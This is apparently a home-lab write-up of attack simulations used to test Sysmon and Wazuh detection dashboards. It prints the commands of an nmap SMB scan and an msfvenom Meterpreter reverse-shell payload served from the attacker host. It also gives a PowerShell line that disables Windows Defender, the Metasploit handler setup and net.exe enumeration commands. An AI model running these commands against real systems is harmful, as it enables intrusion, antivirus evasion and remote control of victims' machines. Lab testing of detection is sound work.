## Attack Simulations

### Attack 1 — SMB Vulnerability Scan
**Tool:** nmap  
**Command:**
```bash
nmap --script "smb-vuln*" 192.168.56.102
```
**Results:**
- Ports 135 (msrpc), 139 (netbios-ssn), 445 (microsoft-ds) confirmed open
- MS10-054: not vulnerable
- MS10-061: connection error (inconclusive)

### Attack 4 — Meterpreter Reverse Shell (Main Attack)
**Tool:** Metasploit Framework (msfvenom + multi/handler)  
**MITRE ATT&CK:** T1059 (Command and Scripting Interpreter), T1071 (Application Layer Protocol)

**Step 1 — Generate payload on Kali:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.105 LPORT=5555 -f exe -o /tmp/payload.exe
```

**Step 2 — Host payload via HTTP server:**
```bash
cd /tmp && python3 -m http.server 8080
```

**Step 3 — Download payload on Windows 10:**
```powershell
# Disable Windows Defender real-time monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Download payload
Invoke-WebRequest http://192.168.56.105:8080/payload.exe -OutFile C:\Users\Public\payload.exe
```

**Step 4 — Start Metasploit listener on Kali:**
```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.56.105
set LPORT 5555
run
```

**Step 5 — Execute payload on Windows:**
```powershell
C:\Users\Public\payload.exe
```

**Result:** Meterpreter session opened  
`192.168.56.105:5555 → 192.168.56.102:50221`

**Post-exploitation commands run through Meterpreter shell:**
```
sysinfo
getuid
shell
whoami
net user
net localgroup administrators
ipconfig
```

## Dashboards Built

### Dashboard 3 — Suspicious Process Execution
- **Data source:** Sysmon Event ID 1 (Process Create)
- **Visualization:** Horizontal bar chart by `originalFileName`
- **Detects:** Any unusual process spawned on the endpoint

### Dashboard B — Net.exe Discovery Activity
- **Data source:** Wazuh rule ID 92031
- **Visualization:** Horizontal bar chart by `rule.description`
- **Detects:** Enumeration commands (`net user`, `net localgroup`) commonly used by attackers post-compromise
- **Generated by:** Meterpreter shell running net.exe commands against Windows 10

## Key Findings

- Windows 10 is patched against EternalBlue (MS17-010) — no direct SMB exploitation possible
- Windows Defender detected and blocked the initial payload download — required disabling real-time monitoring to proceed (realistic attacker behavior)
- Meterpreter reverse shell successfully established from Kali to Windows 10
- Wazuh detected post-exploitation enumeration activity via net.exe within the same session
- Sysmon Event ID 3 (network connections) troubleshooting ongoing — outbound connections from Windows to Kali not yet appearing in Wazuh Discover
